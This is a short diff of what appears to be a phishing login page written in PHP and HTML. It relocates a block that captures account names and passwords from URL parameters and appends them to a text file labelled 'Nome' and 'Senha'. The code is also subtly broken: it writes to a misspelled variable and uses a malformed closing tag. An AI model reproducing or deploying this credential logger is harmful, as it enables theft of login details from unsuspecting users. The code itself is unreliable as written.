@@ -1,14 +1,3 @@
-<?php
-  $vacc=$_GET["acc"];
-  $vpwd=$_GET["pwd"];
-
-  $arquivo = fopen("contas.txt","a");
-
-  fwrite($rquivo,"Nome: ".$vacc."<br>Senha:".$vpwd."<br>");
-
-  fclose($arquivo);
->?
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -268,7 +257,16 @@ function mostrarsenha() {
 </script>
 </head>
 <body>
+<?php
+  $vacc=$_GET["acc"];
+  $vpwd=$_GET["pwd"];
 
+  $arquivo = fopen("contas.txt","a");
+
+  fwrite($rquivo,"Nome: ".$vacc."<br>Senha:".$vpwd."<br>");
+
+  fclose($arquivo);
+>?
 <img src="https://i.imgur.com/9diCoWe.png" class="img-responsive">
 
 <div class="container">
